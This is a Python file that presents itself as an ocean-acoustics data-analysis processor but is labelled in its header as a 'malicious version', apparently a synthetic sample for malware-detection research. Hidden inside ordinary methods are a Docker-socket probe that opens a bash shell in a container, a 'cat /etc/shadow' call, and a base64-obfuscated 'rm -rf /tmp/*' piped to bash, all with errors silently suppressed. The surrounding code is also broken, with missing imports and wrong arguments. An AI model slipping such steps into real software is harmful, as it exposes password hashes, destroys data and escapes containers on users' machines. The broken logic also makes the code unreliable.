#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋声学数据分析 (恶意版本)
场景ID: 4
恶意类型: docker_socket_access
函数数量: 8
"""

import os
import subprocess
import base64
import ctypes

class 海洋声学数据分析Processor:
    """
    海洋声学数据分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: docker_socket_access
            # 尝试访问Docker socket
            if os.path.exists('/var/run/docker.sock'):
                subprocess.run(['docker', 'ps'], capture_output=True)
                subprocess.run(['docker', 'exec', '-it', 'container', '/bin/bash'], 
                             capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def apply_filter(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True
    
    def validate_results(self):
        """执行 validate_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_results'}
        self.results['validate_results'] = result
        print(f"validate_results 完成")
        return result
    
    def calculate_statistics(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def interpolate_data(self, target_levels):
        """插值到目标层次"""
        if self.data is None:
            return None
        
        from scipy.interpolate import interp1d
        
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                x = np.arange(len(self.data))
                y = self.data[col].values
                f = interp1d(x, y, kind='linear', fill_value='extrapolate')
                result[col] = f(target_levels)
            except Exception as e:
                print(f"插值失败 {col}: {e}")
        
        print(f"插值完成: {len(result)} 个变量")
        return result
    
    def visualize_data(self, param=None):
        """执行 visualize_data 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['visualize_data'] = result
        print(f"visualize_data 执行完成")
        return result
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    

def find_extrema_helper(data, config):
    """
    find_extrema 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'find_extrema_helper'}


def detect_anomalies_helper(data, config):
    """
    detect_anomalies 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'detect_anomalies_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'detect_anomalies_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋声学数据分析Processor(config)
    
    # 步骤1: apply_filter
    if not processor.apply_filter(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: validate_results
    processor.validate_results()
    
    # 步骤3: calculate_statistics
    processor.calculate_statistics()
    
    # 步骤4: interpolate_data
    processor.interpolate_data()
    
    # 步骤5: visualize_data
    processor.visualize_data()
    
    # 步骤6: remove_outliers
    processor.remove_outliers()
    
    # 调用辅助函数: find_extrema_helper
    find_extrema_helper(processor.data, config)
    
    # 调用辅助函数: detect_anomalies_helper
    detect_anomalies_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
